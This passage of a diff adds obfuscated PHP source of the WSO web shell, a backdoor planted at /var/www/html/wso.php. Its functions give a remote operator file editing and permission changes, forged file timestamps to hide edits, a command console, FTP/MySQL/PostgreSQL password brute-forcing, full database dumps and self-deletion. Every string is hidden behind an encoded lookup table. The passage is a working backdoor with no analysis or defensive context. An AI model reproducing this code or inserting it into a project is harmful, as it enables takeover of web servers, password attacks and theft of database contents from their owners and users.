+                echo str_replace(array($GLOBALS[ям][0x23b], $GLOBALS[ям][0x23c]), array($GLOBALS[ям][0x23d], $GLOBALS[ям][0x10f]), $code) . $GLOBALS[ям][0x180];
+            }
+            break;
+        case $GLOBALS[ям][0x23e]:
+            if (!empty($_POST[$GLOBALS[ям][0x9f]])) {
+                $perms = 0;
+                for ($i = strlen($_POST[$GLOBALS[ям][0x9f]]) - 0x1; $i >= 0; --$i) {
+                    $perms += (int) $_POST[$GLOBALS[ям][0x9f]][$i] * pow(0x8, strlen($_POST[$GLOBALS[ям][0x9f]]) - $i - 0x1);
+                }
+                if (!@chmod($_POST[$GLOBALS[ям][0x99]], $perms)) {
+                    echo $GLOBALS[ям][0x23f];
+                }
+            }
+            clearstatcache();
+            echo $GLOBALS[ям][0x240] . urlencode($_POST[$GLOBALS[ям][0x99]]) . $GLOBALS[ям][0x241] . substr(sprintf($GLOBALS[ям][0x242], fileperms($_POST[$GLOBALS[ям][0x99]])), -4) . $GLOBALS[ям][0x243];
+            break;
+        case $GLOBALS[ям][0x244]:
+            if (!is_writable($_POST[$GLOBALS[ям][0x99]])) {
+                echo $GLOBALS[ям][0x245];
+                break;
+            }
+            if (!empty($_POST[$GLOBALS[ям][0x9f]])) {
+                $time = @filemtime($_POST[$GLOBALS[ям][0x99]]);
+                $_POST[$GLOBALS[ям][0x9f]] = substr($_POST[$GLOBALS[ям][0x9f]], 0x1);
+                $fp = @fopen($_POST[$GLOBALS[ям][0x99]], $GLOBALS[ям][0x246]);
+                if ($fp) {
+                    @fwrite($fp, $_POST[$GLOBALS[ям][0x9f]]);
+                    @fclose($fp);
+                    echo $GLOBALS[ям][0x247];
+                    @touch($_POST[$GLOBALS[ям][0x99]], $time, $time);
+                }
+            }
+            echo $GLOBALS[ям][0x248] . urlencode($_POST[$GLOBALS[ям][0x99]]) . $GLOBALS[ям][0x249];
+            $fp = @fopen($_POST[$GLOBALS[ям][0x99]], $GLOBALS[ям][0xa3]);
+            if ($fp) {
+                while (!@feof($fp)) {
+                    echo htmlspecialchars(@fread($fp, 0x400));
+                }
+                @fclose($fp);
+            }
+            echo $GLOBALS[ям][0x24a];
+            break;
+        case $GLOBALS[ям][0x24b]:
+            $c = @file_get_contents($_POST[$GLOBALS[ям][0x99]]);
+            $n = 0;
+            $h = array($GLOBALS[ям][0x24c], $GLOBALS[ям][0x9b], $GLOBALS[ям][0x9b]);
+            $len = strlen($c);
+            for ($i = 0; $i < $len; ++$i) {
+                $h[0x1] .= sprintf($GLOBALS[ям][0x1e1], ord($c[$i])) . $GLOBALS[ям][0xe3];
+                switch (ord($c[$i])) {
+                    case 0:
+                        $h[0x2] .= $GLOBALS[ям][0xe3];
+                        break;
+                    case 0x9:
+                        $h[0x2] .= $GLOBALS[ям][0xe3];
+                        break;
+                    case 0xa:
+                        $h[0x2] .= $GLOBALS[ям][0xe3];
+                        break;
+                    case 0xd:
+                        $h[0x2] .= $GLOBALS[ям][0xe3];
+                        break;
+                    default:
+                        $h[0x2] .= $c[$i];
+                        break;
+                }
+                $n++;
+                if ($n == 0x20) {
+                    $n = 0;
+                    if ($i + 0x1 < $len) {
+                        $h[0] .= sprintf($GLOBALS[ям][0x24d], $i + 0x1) . $GLOBALS[ям][0xdf];
+                    }
+                    $h[0x1] .= $GLOBALS[ям][0xdf];
+                    $h[0x2] .= $GLOBALS[ям][0x9a];
+                }
+            }
+            echo $GLOBALS[ям][0x24e] . $h[0] . $GLOBALS[ям][0x24f] . $h[0x1] . $GLOBALS[ям][0x250] . htmlspecialchars($h[0x2]) . $GLOBALS[ям][0x251];
+            break;
+        case $GLOBALS[ям][0x252]:
+            if (!empty($_POST[$GLOBALS[ям][0x9f]])) {
+                if (!@rename($_POST[$GLOBALS[ям][0x99]], $_POST[$GLOBALS[ям][0x9f]])) {
+                    echo $GLOBALS[ям][0x253];
+                } else {
+                    die($GLOBALS[ям][0x254] . urlencode($_POST[$GLOBALS[ям][0x9f]]) . $GLOBALS[ям][0x255]);
+                }
+            }
+            echo $GLOBALS[ям][0x248] . urlencode($_POST[$GLOBALS[ям][0x99]]) . $GLOBALS[ям][0x256] . htmlspecialchars($_POST[$GLOBALS[ям][0x99]]) . $GLOBALS[ям][0x243];
+            break;
+        case $GLOBALS[ям][0x257]:
+            if (!empty($_POST[$GLOBALS[ям][0x9f]])) {
+                $time = strtotime($_POST[$GLOBALS[ям][0x9f]]);
+                if ($time) {
+                    if (!touch($_POST[$GLOBALS[ям][0x99]], $time, $time)) {
+                        echo $GLOBALS[ям][0x258];
+                    } else {
+                        echo $GLOBALS[ям][0x259];
+                    }
+                } else {
+                    echo $GLOBALS[ям][0x25a];
+                }
+            }
+            clearstatcache();
+            echo $GLOBALS[ям][0x240] . urlencode($_POST[$GLOBALS[ям][0x99]]) . $GLOBALS[ям][0x25b] . date($GLOBALS[ям][0x25c], @filemtime($_POST[$GLOBALS[ям][0x99]])) . $GLOBALS[ям][0x243];
+            break;
+    }
+    echo $GLOBALS[ям][0x180];
+    wsoFooter();
+}
+function actionConsole()
+{
+    if (!empty($_POST[$GLOBALS[ям][0x99]]) && !empty($_POST[$GLOBALS[ям][0x9d]])) {
+        WSOsetcookie(md5($_SERVER[$GLOBALS[ям][0x20]]) . $GLOBALS[ям][0x25d], !0);
+        $_POST[$GLOBALS[ям][0x99]] .= $GLOBALS[ям][0x25e];
+    } elseif (!empty($_POST[$GLOBALS[ям][0x99]])) {
+        WSOsetcookie(md5($_SERVER[$GLOBALS[ям][0x20]]) . $GLOBALS[ям][0x25d], 0);
+    }
+    if (isset($_POST[$GLOBALS[ям][0x21]])) {
+        WSOsetcookie(md5($_SERVER[$GLOBALS[ям][0x20]]) . $GLOBALS[ям][0x21], !0);
+        ob_start();
+        echo $GLOBALS[ям][0x25f];
+        $temp = @iconv($_POST[$GLOBALS[ям][0x90]], $GLOBALS[ям][0xad], addcslashes($GLOBALS[ям][0x260] . $_POST[$GLOBALS[ям][0x99]] . $GLOBALS[ям][0x9a] . wsoEx($_POST[$GLOBALS[ям][0x99]]), $GLOBALS[ям][0x182]));
+        if (preg_match($GLOBALS[ям][0x261], $_POST[$GLOBALS[ям][0x99]], $match)) {
+            if (@chdir($match[0x1])) {
+                $GLOBALS[$GLOBALS[ям][0x94]] = @getcwd();
+                echo $GLOBALS[ям][0x262] . $GLOBALS[$GLOBALS[ям][0x94]] . $GLOBALS[ям][0x263];
+            }
+        }
+        echo $GLOBALS[ям][0x264] . $temp . $GLOBALS[ям][0x263];
+        echo $GLOBALS[ям][0x265];
+        $temp = ob_get_clean();
+        echo strlen($temp), $GLOBALS[ям][0x9a], $temp;
+        exit;
+    }
+    if (empty($_POST[$GLOBALS[ям][0x21]]) && !empty($_POST[$GLOBALS[ям][0x99]])) {
+        WSOsetcookie(md5($_SERVER[$GLOBALS[ям][0x20]]) . $GLOBALS[ям][0x21], 0);
+    }
+    wsoHeader();
+    echo $GLOBALS[ям][0x266];
+    echo $GLOBALS[ям][0x267];
+    foreach ($GLOBALS[$GLOBALS[ям][0x268]] as $n => $v) {
+        if ($v == $GLOBALS[ям][0x9b]) {
+            echo $GLOBALS[ям][0x269] . htmlspecialchars($n) . $GLOBALS[ям][0x26a];
+            continue;
+        }
+        echo $GLOBALS[ям][0xb1] . htmlspecialchars($v) . $GLOBALS[ям][0x26b] . $n . $GLOBALS[ям][0xb5];
+    }
+    echo $GLOBALS[ям][0x26c] . (@$_COOKIE[md5($_SERVER[$GLOBALS[ям][0x20]]) . $GLOBALS[ям][0x21]] ? $GLOBALS[ям][0x190] : $GLOBALS[ям][0x9b]) . $GLOBALS[ям][0x26d] . (!empty($_POST[$GLOBALS[ям][0x9d]]) || $_COOKIE[md5($_SERVER[$GLOBALS[ям][0x20]]) . $GLOBALS[ям][0x25d]] ? $GLOBALS[ям][0x190] : $GLOBALS[ям][0x9b]) . $GLOBALS[ям][0x26e];
+    if (!empty($_POST[$GLOBALS[ям][0x99]])) {
+        echo htmlspecialchars($GLOBALS[ям][0x26f] . $_POST[$GLOBALS[ям][0x99]] . $GLOBALS[ям][0x9a] . wsoEx($_POST[$GLOBALS[ям][0x99]]));
+    }
+    echo $GLOBALS[ям][0x270];
+    echo $GLOBALS[ям][0x271];
+    wsoFooter();
+}
+function actionLogout()
+{
+    setcookie(md5($_SERVER[$GLOBALS[ям][0x20]]), $GLOBALS[ям][0x9b], time() - 0xe10);
+    die($GLOBALS[ям][0x272]);
+}
+function actionSelfRemove()
+{
+    $namefile = basename("/var/www/html/wso.php");
+    if (preg_match($GLOBALS[ям][0x273], $namefile)) {
+        preg_match($GLOBALS[ям][0x274], $namefile, $namefile2);
+        $namefile = $namefile2[0x1] . $GLOBALS[ям][0x275];
+    } elseif (preg_match($GLOBALS[ям][0x276], $namefile)) {
+        preg_match($GLOBALS[ям][0x277], $namefile, $namefile2);
+        $namefile = $namefile2[0x1] . $GLOBALS[ям][0x278];
+    } elseif (preg_match($GLOBALS[ям][0x279], $namefile)) {
+        preg_match($GLOBALS[ям][0x27a], $namefile, $namefile2);
+        $namefile = $namefile2[0x1] . $GLOBALS[ям][0x27b];
+    } elseif (preg_match($GLOBALS[ям][0x27c], $namefile)) {
+        preg_match($GLOBALS[ям][0x27d], $namefile, $namefile2);
+        $namefile = $namefile2[0x1] . $GLOBALS[ям][0x27e];
+    }
+    if ($_POST[$GLOBALS[ям][0x99]] == $GLOBALS[ям][0x27f]) {
+        if (@unlink(preg_replace($GLOBALS[ям][0x280], $GLOBALS[ям][0x9b], $namefile))) {
+            die($GLOBALS[ям][0x281]);
+        } else {
+            echo $GLOBALS[ям][0x282];
+        }
+    }
+    if ($_POST[$GLOBALS[ям][0x99]] != $GLOBALS[ям][0x27f]) {
+        wsoHeader();
+    }
+    echo $GLOBALS[ям][0x283];
+    wsoFooter();
+}
+function actionBruteforce()
+{
+    wsoHeader();
+    if (isset($_POST[$GLOBALS[ям][0x284]])) {
+        echo $GLOBALS[ям][0x285] . htmlspecialchars($_POST[$GLOBALS[ям][0x284]]) . $GLOBALS[ям][0x286] . htmlspecialchars($_POST[$GLOBALS[ям][0x287]]) . $GLOBALS[ям][0xdf];
+        if ($_POST[$GLOBALS[ям][0x284]] == $GLOBALS[ям][0x288]) {
+            function wsoBruteForce($ip, $port, $login, $pass)
+            {
+                $fp = @ftp_connect($ip, $port ? $port : 0x15);
+                if (!$fp) {
+                    return !1;
+                }
+                $res = @ftp_login($fp, $login, $pass);
+                @ftp_close($fp);
+                return $res;
+            }
+        } elseif ($_POST[$GLOBALS[ям][0x284]] == $GLOBALS[ям][0x289]) {
+            function wsoBruteForce($ip, $port, $login, $pass)
+            {
+                $res = @mysql_connect($ip . $GLOBALS[ям][0x178] . ($port ? $port : 0xcea), $login, $pass);
+                @mysql_close($res);
+                return $res;
+            }
+        } elseif ($_POST[$GLOBALS[ям][0x284]] == $GLOBALS[ям][0x28a]) {
+            function wsoBruteForce($ip, $port, $login, $pass)
+            {
+                $str = $GLOBALS[ям][0x28b] . $ip . $GLOBALS[ям][0x28c] . $port . $GLOBALS[ям][0x28d] . $login . $GLOBALS[ям][0x28e] . $pass . $GLOBALS[ям][0x28f];
+                $res = @pg_connect($str);
+                @pg_close($res);
+                return $res;
+            }
+        }
+        $success = 0;
+        $attempts = 0;
+        $server = explode($GLOBALS[ям][0x290], $_POST[$GLOBALS[ям][0x287]]);
+        if ($_POST[$GLOBALS[ям][0x1b6]] == 0x1) {
+            $temp = @file($GLOBALS[ям][0x135]);
+            if (is_array($temp)) {
+                foreach ($temp as $line) {
+                    $line = explode($GLOBALS[ям][0x290], $line);
+                    ++$attempts;
+                    if (wsoBruteForce(@$server[0], @$server[0x1], $line[0], $line[0])) {
+                        $success++;
+                        echo $GLOBALS[ям][0x291] . htmlspecialchars($line[0]) . $GLOBALS[ям][0x292] . htmlspecialchars($line[0]) . $GLOBALS[ям][0xdf];
+                    }
+                    if (@$_POST[$GLOBALS[ям][0x293]]) {
+                        $tmp = $GLOBALS[ям][0x3d];
+                        for ($i = strlen($line[0]) - 0x1; $i >= 0; --$i) {
+                            $tmp .= $line[0][$i];
+                        }
+                        ++$attempts;
+                        if (wsoBruteForce(@$server[0], @$server[0x1], $line[0], $tmp)) {
+                            $success++;
+                            echo $GLOBALS[ям][0x291] . htmlspecialchars($line[0]) . $GLOBALS[ям][0x292] . htmlspecialchars($tmp);
+                        }
+                    }
+                }
+            }
+        } elseif ($_POST[$GLOBALS[ям][0x1b6]] == 0x2) {
+            $temp = @file($_POST[$GLOBALS[ям][0x294]]);
+            if (is_array($temp)) {
+                foreach ($temp as $line) {
+                    $line = trim($line);
+                    ++$attempts;
+                    if (wsoBruteForce($server[0], @$server[0x1], $_POST[$GLOBALS[ям][0x295]], $line)) {
+                        $success++;
+                        echo $GLOBALS[ям][0x291] . htmlspecialchars($_POST[$GLOBALS[ям][0x295]]) . $GLOBALS[ям][0x292] . htmlspecialchars($line) . $GLOBALS[ям][0xdf];
+                    }
+                }
+            }
+        }
+        echo "<span>Attempts:</span> {$attempts} <span>Success:</span> {$success}</div><br>";
+    }
+    echo $GLOBALS[ям][0x296] . $GLOBALS[ям][0x297] . $GLOBALS[ям][0x298] . htmlspecialchars($GLOBALS[$GLOBALS[ям][0x94]]) . $GLOBALS[ям][0x26b] . $GLOBALS[ям][0x299] . htmlspecialchars($_POST[$GLOBALS[ям][0x96]]) . $GLOBALS[ям][0x26b] . $GLOBALS[ям][0x29a] . htmlspecialchars($_POST[$GLOBALS[ям][0x90]]) . $GLOBALS[ям][0x26b] . $GLOBALS[ям][0x29b] . $GLOBALS[ям][0x29c] . $GLOBALS[ям][0x29d] . $GLOBALS[ям][0x29e] . $GLOBALS[ям][0x29f] . $GLOBALS[ям][0x2a0] . $GLOBALS[ям][0x2a1] . $GLOBALS[ям][0x2a2] . $GLOBALS[ям][0x2a3] . $GLOBALS[ям][0x2a4] . htmlspecialchars($GLOBALS[$GLOBALS[ям][0x94]]) . $GLOBALS[ям][0x2a5] . $GLOBALS[ям][0x2a6];
+    echo $GLOBALS[ям][0x18c];
+    wsoFooter();
+}
+function actionSql()
+{
+    class DbClass
+    {
+        var $type;
+        var $link;
+        var $res;
+        function DbClass($type)
+        {
+            $this->type = $type;
+        }
+        function connect($host, $user, $pass, $dbname)
+        {
+            switch ($this->type) {
+                case $GLOBALS[ям][0x289]:
+                    if ($this->link = @mysql_connect($host, $user, $pass, !0)) {
+                        return !0;
+                    }
+                    break;
+                case $GLOBALS[ям][0x28a]:
+                    $host = explode($GLOBALS[ям][0x178], $host);
+                    if (!$host[0x1]) {
+                        $host[0x1] = 0x1538;
+                    }
+                    if ($this->link = @pg_connect("host={$host[0]} port={$host[0x1]} user={$user} password={$pass} dbname={$dbname}")) {
+                        return !0;
+                    }
+                    break;
+            }
+            return !1;
+        }
+        function selectdb($db)
+        {
+            switch ($this->type) {
+                case $GLOBALS[ям][0x289]:
+                    if (@mysql_select_db($db)) {
+                        return !0;
+                    }
+                    break;
+            }
+            return !1;
+        }
+        function query($str)
+        {
+            switch ($this->type) {
+                case $GLOBALS[ям][0x289]:
+                    return $this->res = @mysql_query($str);
+                case $GLOBALS[ям][0x28a]:
+                    return $this->res = @pg_query($this->link, $str);
+            }
+            return !1;
+        }
+        function fetch()
+        {
+            $res = func_num_args() ? func_get_arg(0) : $this->res;
+            switch ($this->type) {
+                case $GLOBALS[ям][0x289]:
+                    return @mysql_fetch_assoc($res);
+                case $GLOBALS[ям][0x28a]:
+                    return @pg_fetch_assoc($res);
+            }
+            return !1;
+        }
+        function listDbs()
+        {
+            switch ($this->type) {
+                case $GLOBALS[ям][0x289]:
+                    return $this->query($GLOBALS[ям][0x2a7]);
+                case $GLOBALS[ям][0x28a]:
+                    return $this->res = $this->query($GLOBALS[ям][0x2a8]);
+            }
+            return !1;
+        }
+        function listTables()
+        {
+            switch ($this->type) {
+                case $GLOBALS[ям][0x289]:
+                    return $this->res = $this->query($GLOBALS[ям][0x2a9]);
+                case $GLOBALS[ям][0x28a]:
+                    return $this->res = $this->query($GLOBALS[ям][0x2aa]);
+            }
+            return !1;
+        }
+        function error()
+        {
+            switch ($this->type) {
+                case $GLOBALS[ям][0x289]:
+                    return @mysql_error();
+                case $GLOBALS[ям][0x28a]:
+                    return @pg_last_error();
+            }
+            return !1;
+        }
+        function setCharset($str)
+        {
+            switch ($this->type) {
+                case $GLOBALS[ям][0x289]:
+                    if (function_exists($GLOBALS[ям][0x2ab])) {
+                        return @mysql_set_charset($str, $this->link);
+                    } else {
+                        $this->query($GLOBALS[ям][0x2ac] . $str);
+                    }
+                    break;
+                case $GLOBALS[ям][0x28a]:
+                    return @pg_set_client_encoding($this->link, $str);
+            }
+            return !1;
+        }
+        function loadFile($str)
+        {
+            switch ($this->type) {
+                case $GLOBALS[ям][0x289]:
+                    return $this->fetch($this->query($GLOBALS[ям][0x2ad] . addslashes($str) . $GLOBALS[ям][0x2ae]));
+                case $GLOBALS[ям][0x28a]:
+                    $this->query($GLOBALS[ям][0x2af] . addslashes($str) . $GLOBALS[ям][0x2b0]);
+                    $r = array();
+                    while ($i = $this->fetch()) {
+                        $r[] = $i[$GLOBALS[ям][0x1b7]];
+                    }
+                    $this->query($GLOBALS[ям][0x2b1]);
+                    return array($GLOBALS[ям][0x1b7] => implode($GLOBALS[ям][0x9a], $r));
+            }
+            return !1;
+        }
+        function dump($table, $fp = false)
+        {
+            switch ($this->type) {
+                case $GLOBALS[ям][0x289]:
+                    $res = $this->query($GLOBALS[ям][0x2b2] . $table . $GLOBALS[ям][0x2b3]);
+                    $create = mysql_fetch_array($res);
+                    $sql = $create[0x1] . $GLOBALS[ям][0x2b4];
+                    if ($fp) {
+                        fwrite($fp, $sql);
+                    } else {
+                        echo $sql;
+                    }
+                    $this->query($GLOBALS[ям][0x2b5] . $table . $GLOBALS[ям][0x2b3]);
+                    $i = 0;
+                    $head = !0;
+                    while ($item = $this->fetch()) {
+                        $sql = $GLOBALS[ям][0x9b];
+                        if ($i % 0x3e8 == 0) {
+                            $head = !0;
+                            $sql = $GLOBALS[ям][0x2b6];
+                        }
+                        $columns = array();
+                        foreach ($item as $k => $v) {
+                            if ($v === null) {
+                                $item[$k] = $GLOBALS[ям][0x2b7];
+                            } elseif (is_int($v)) {
+                                $item[$k] = $v;
+                            } else {
+                                $item[$k] = $GLOBALS[ям][0x2b8] . @mysql_real_escape_string($v) . $GLOBALS[ям][0x2b8];
+                            }
+                            $columns[] = $GLOBALS[ям][0x2b9] . $k . $GLOBALS[ям][0x2b9];
+                        }
+                        if ($head) {
+                            $sql .= $GLOBALS[ям][0x2ba] . $table . $GLOBALS[ям][0x2bb] . implode($GLOBALS[ям][0x2bc], $columns) . $GLOBALS[ям][0x2bd] . implode($GLOBALS[ям][0x2bc], $item) . $GLOBALS[ям][0x2be];
+                            $head = !1;
+                        } else {
+                            $sql .= $GLOBALS[ям][0x2bf] . implode($GLOBALS[ям][0x2bc], $item) . $GLOBALS[ям][0x2be];
+                        }
+                        if ($fp) {
+                            fwrite($fp, $sql);
+                        } else {
+                            echo $sql;
+                        }
+                        $i++;
+                    }
+                    if (!$head) {
+                        if ($fp) {
+                            fwrite($fp, $GLOBALS[ям][0x2b6]);
+                        } else {
+                            echo $GLOBALS[ям][0x2b6];
+                        }
+                    }
+                    break;
+                case $GLOBALS[ям][0x28a]:
+                    $this->query($GLOBALS[ям][0x2c0] . $table);
+                    while ($item = $this->fetch()) {
+                        $columns = array();
+                        foreach ($item as $k => $v) {
+                            $item[$k] = $GLOBALS[ям][0x2b8] . addslashes($v) . $GLOBALS[ям][0x2b8];
+                            $columns[] = $k;
+                        }
+                        $sql = $GLOBALS[ям][0x2c1] . $table . $GLOBALS[ям][0xe1] . implode($GLOBALS[ям][0x2bc], $columns) . $GLOBALS[ям][0x2c2] . implode($GLOBALS[ям][0x2bc], $item) . $GLOBALS[ям][0x2c3] . $GLOBALS[ям][0x9a];
+                        if ($fp) {
+                            fwrite($fp, $sql);
+                        } else {
+                            echo $sql;
+                        }
+                    }
+                    break;
+            }
+            return !1;
+        }
+    }
+    $db = new DbClass($_POST[$GLOBALS[ям][0x1b6]]);
+    if (@$_POST[$GLOBALS[ям][0x9d]] == $GLOBALS[ям][0x219] && @$_POST[$GLOBALS[ям][0x99]] != $GLOBALS[ям][0x2c4]) {
+        $db->connect($_POST[$GLOBALS[ям][0x2c5]], $_POST[$GLOBALS[ям][0x2c6]], $_POST[$GLOBALS[ям][0x2c7]], $_POST[$GLOBALS[ям][0x2c8]]);
+        $db->selectdb($_POST[$GLOBALS[ям][0x2c8]]);
+        switch ($_POST[$GLOBALS[ям][0x90]]) {
+            case $GLOBALS[ям][0x2c9]:
+                $db->setCharset($GLOBALS[ям][0x2ca]);
+                break;
+            case $GLOBALS[ям][0x2cb]:
+                $db->setCharset($GLOBALS[ям][0x2cc]);
+                break;
+            case $GLOBALS[ям][0x2cd]:
+                $db->setCharset($GLOBALS[ям][0x2ce]);
+                break;
+            case $GLOBALS[ям][0x2cf]:
+                $db->setCharset($GLOBALS[ям][0x2d0]);
+                break;
+            case $GLOBALS[ям][0x2d1]:
+                $db->setCharset($GLOBALS[ям][0xb0]);
+                break;
+        }
+        if (empty($_POST[$GLOBALS[ям][0x1b7]])) {
+            ob_start($GLOBALS[ям][0x21a], 0x1000);
+            header($GLOBALS[ям][0x2d2]);
+            header($GLOBALS[ям][0x2d3]);
+            foreach ($_POST[$GLOBALS[ям][0x2d4]] as $v) {
+                $db->dump($v);
+            }
+            exit;
+        } elseif ($fp = @fopen($_POST[$GLOBALS[ям][0x1b7]], $GLOBALS[ям][0x109])) {
+            foreach ($_POST[$GLOBALS[ям][0x2d4]] as $v) {
+                $db->dump($v, $fp);
+            }
+            fclose($fp);
+            unset($_POST[$GLOBALS[ям][0x9d]]);
+        } else {
+            die($GLOBALS[ям][0x2d5]);
+        }
+    }
+    wsoHeader();
+    echo $GLOBALS[ям][0x2d6] . htmlspecialchars($GLOBALS[$GLOBALS[ям][0x94]]) . $GLOBALS[ям][0x2d7] . (isset($_POST[$GLOBALS[ям][0x90]]) ? $_POST[$GLOBALS[ям][0x90]] : $GLOBALS[ям][0x9b]) . $GLOBALS[ям][0x2d8];
+    if (@$_POST[$GLOBALS[ям][0x1b6]] == $GLOBALS[ям][0x289]) {
+        echo $GLOBALS[ям][0xb3];
+    }
+    echo $GLOBALS[ям][0x2d9];
+    if (@$_POST[$GLOBALS[ям][0x1b6]] == $GLOBALS[ям][0x28a]) {
+        echo $GLOBALS[ям][0xb3];
+    }
+    echo $GLOBALS[ям][0x2da] . (empty($_POST[$GLOBALS[ям][0x2c5]]) ? $GLOBALS[ям][0x2db] : htmlspecialchars($_POST[$GLOBALS[ям][0x2c5]])) . $GLOBALS[ям][0x2dc] . (empty($_POST[$GLOBALS[ям][0x2c6]]) ? $GLOBALS[ям][0x2dd] : htmlspecialchars($_POST[$GLOBALS[ям][0x2c6]])) . $GLOBALS[ям][0x2de] . (empty($_POST[$GLOBALS[ям][0x2c7]]) ? $GLOBALS[ям][0x9b] : htmlspecialchars($_POST[$GLOBALS[ям][0x2c7]])) . $GLOBALS[ям][0x2df];
+    $tmp = $GLOBALS[ям][0x2e0];
+    if (isset($_POST[$GLOBALS[ям][0x2c5]])) {
+        if ($db->connect($_POST[$GLOBALS[ям][0x2c5]], $_POST[$GLOBALS[ям][0x2c6]], $_POST[$GLOBALS[ям][0x2c7]], $_POST[$GLOBALS[ям][0x2c8]])) {
+            switch ($_POST[$GLOBALS[ям][0x90]]) {
+                case $GLOBALS[ям][0x2c9]:
+                    $db->setCharset($GLOBALS[ям][0x2ca]);
+                    break;
+                case $GLOBALS[ям][0x2cb]:
+                    $db->setCharset($GLOBALS[ям][0x2cc]);
+                    break;
+                case $GLOBALS[ям][0x2cd]:
+                    $db->setCharset($GLOBALS[ям][0x2ce]);
+                    break;
+                case $GLOBALS[ям][0x2cf]:
+                    $db->setCharset($GLOBALS[ям][0x2d0]);
+                    break;
+                case $GLOBALS[ям][0x2d1]:
+                    $db->setCharset($GLOBALS[ям][0xb0]);
+                    break;
+            }
+            $db->listDbs();
+            echo $GLOBALS[ям][0x2e1];
+            while ($item = $db->fetch()) {
+                list($key, $value) = each($item);
+                echo $GLOBALS[ям][0xb1] . $value . $GLOBALS[ям][0xb2] . ($value == $_POST[$GLOBALS[ям][0x2c8]] ? $GLOBALS[ям][0xb3] : $GLOBALS[ям][0x9b]) . $GLOBALS[ям][0xb4] . $value . $GLOBALS[ям][0xb5];
+            }
+            echo $GLOBALS[ям][0x2e2];
+        } else {
+            echo $tmp;
+        }
+    } else {
+        echo $tmp;
+    }
+    echo $GLOBALS[ям][0x2e3] . (empty($_POST[$GLOBALS[ям][0x2e4]]) ? $GLOBALS[ям][0x9b] : $GLOBALS[ям][0x2e5]) . $GLOBALS[ям][0x2e6] . @addslashes($_POST[$GLOBALS[ям][0x2c8]]) . $GLOBALS[ям][0x2e7];
+    if (isset($db) && $db->link) {
+        echo $GLOBALS[ям][0x2e8];
+        if (!empty($_POST[$GLOBALS[ям][0x2c8]])) {
+            $db->selectdb($_POST[$GLOBALS[ям][0x2c8]]);
+            echo $GLOBALS[ям][0x2e9];
+            $tbls_res = $db->listTables();
+            while ($item = $db->fetch($tbls_res)) {
+                list($key, $value) = each($item);
+                if (!empty($_POST[$GLOBALS[ям][0x2e4]])) {
+                    $n = $db->fetch($db->query($GLOBALS[ям][0x2ea] . $value . $GLOBALS[ям][0x9b]));
+                }
+                $value = htmlspecialchars($value);
+                echo $GLOBALS[ям][0x2eb] . $value . $GLOBALS[ям][0x2ec] . $value . $GLOBALS[ям][0x2ed] . $value . $GLOBALS[ям][0x2ee] . (empty($_POST[$GLOBALS[ям][0x2e4]]) ? $GLOBALS[ям][0x2ef] : " <small>({$n[$GLOBALS[ям][0x2f0]]})</small>") . $GLOBALS[ям][0x2f1];
+            }
+            echo $GLOBALS[ям][0x2f2];
+            if (@$_POST[$GLOBALS[ям][0x99]] == $GLOBALS[ям][0x2c4]) {
+                $_POST[$GLOBALS[ям][0x99]] = $GLOBALS[ям][0x2f3];
+                $_POST[$GLOBALS[ям][0x9f]] = $_POST[$GLOBALS[ям][0x9f]] ? $_POST[$GLOBALS[ям][0x9f]] : 0x1;
+                $db->query($GLOBALS[ям][0x2ea] . $_POST[$GLOBALS[ям][0x9d]]);
+                $num = $db->fetch();
+                $pages = ceil($num[$GLOBALS[ям][0x2f0]] / 0x1e);
+                echo $GLOBALS[ям][0x2f4] . $_POST[$GLOBALS[ям][0x9d]] . $GLOBALS[ям][0x2f5] . $_POST[$GLOBALS[ям][0x9d]] . "</span> ({$num[$GLOBALS[ям][0x2f0]]} records) Page # <input type=text name='p3' value=" . (int) $_POST[$GLOBALS[ям][0x9f]] . $GLOBALS[ям][0x2f6];
+                echo " of {$pages}";
+                if ($_POST[$GLOBALS[ям][0x9f]] > 0x1) {
+                    echo $GLOBALS[ям][0x2f7] . $_POST[$GLOBALS[ям][0x9d]] . $GLOBALS[ям][0x2f8] . ($_POST[$GLOBALS[ям][0x9f]] - 0x1) . $GLOBALS[ям][0x2f9];
+                }
+                if ($_POST[$GLOBALS[ям][0x9f]] < $pages) {
+                    echo $GLOBALS[ям][0x2f7] . $_POST[$GLOBALS[ям][0x9d]] . $GLOBALS[ям][0x2f8] . ($_POST[$GLOBALS[ям][0x9f]] + 0x1) . $GLOBALS[ям][0x2fa];
+                }
+                $_POST[$GLOBALS[ям][0x9f]]--;
+                if ($_POST[$GLOBALS[ям][0x1b6]] == $GLOBALS[ям][0x28a]) {
+                    $_POST[$GLOBALS[ям][0x9d]] = $GLOBALS[ям][0x2c0] . $_POST[$GLOBALS[ям][0x9d]] . $GLOBALS[ям][0x2fb] . $_POST[$GLOBALS[ям][0x9f]] * 0x1e;
+                } else {
+                    $_POST[$GLOBALS[ям][0x9d]] = $GLOBALS[ям][0x2b5] . $_POST[$GLOBALS[ям][0x9d]] . $GLOBALS[ям][0x2fc] . $_POST[$GLOBALS[ям][0x9f]] * 0x1e . $GLOBALS[ям][0x2fd];
+                }
+                echo $GLOBALS[ям][0x2fe];
+            }
+            if (@$_POST[$GLOBALS[ям][0x99]] == $GLOBALS[ям][0x2f3] && !empty($_POST[$GLOBALS[ям][0x9d]])) {
+                $db->query(@$_POST[$GLOBALS[ям][0x9d]]);
+                if ($db->res !== !1) {
+                    $title = !1;
+                    echo $GLOBALS[ям][0x2ff];
+                    $line = 0x1;
+                    while ($item = $db->fetch()) {
+                        if (!$title) {
+                            echo $GLOBALS[ям][0x300];
+                            foreach ($item as $key => $value) {
+                                echo $GLOBALS[ям][0x301] . $key . $GLOBALS[ям][0x302];
+                            }
+                            reset($item);
+                            $title = !0;
+                            echo $GLOBALS[ям][0x303];
+                            $line = 0x2;
+                        }
+                        echo $GLOBALS[ям][0x304] . $line . $GLOBALS[ям][0x26b];
+                        $line = $line == 0x1 ? 0x2 : 0x1;
+                        foreach ($item as $key => $value) {
+                            if ($value == null) {
+                                echo $GLOBALS[ям][0x305];
+                            } else {
+                                echo $GLOBALS[ям][0x306] . nl2br(htmlspecialchars($value)) . $GLOBALS[ям][0xe7];
+                            }
+                        }
+                        echo $GLOBALS[ям][0x307];
+                    }
+                    echo $GLOBALS[ям][0x308];
+                } else {
+                    echo $GLOBALS[ям][0x309] . htmlspecialchars($db->error()) . $GLOBALS[ям][0x180];
+                }
+            }
+            echo $GLOBALS[ям][0x30a];
+            if (!empty($_POST[$GLOBALS[ям][0x9d]]) && $_POST[$GLOBALS[ям][0x99]] != $GLOBALS[ям][0x30b]) {
+                echo htmlspecialchars($_POST[$GLOBALS[ям][0x9d]]);
+            }
